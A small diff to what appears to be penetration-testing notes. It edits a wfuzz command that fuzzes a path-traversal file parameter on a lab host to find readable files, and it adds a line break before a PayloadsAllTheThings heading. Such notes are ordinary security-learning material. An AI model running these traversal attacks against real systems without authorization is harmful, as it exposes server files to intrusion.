@@ -15,9 +15,10 @@ Then use the list to find out which ones work:
 > wfuzz -u http://10.10.10.10:80/index.php/file=../../../../../../../../..FUZZ -w ./list.txt
 
 Find out how many characters a wrong request is, then filter those out:
-> wfuzz -u http://10.10.10.10:80/index.php/file=../../../../../../../../..FUZZ -w ./list.txt -hh 376
+> wfuzz -u http://10.10.10.10:80/index.php/file=../../../../../../../../..FUZZ -w ./list.txt -hh 1000
 
 ```
+
 
 ###### PayloadsAllTheThings
 ```
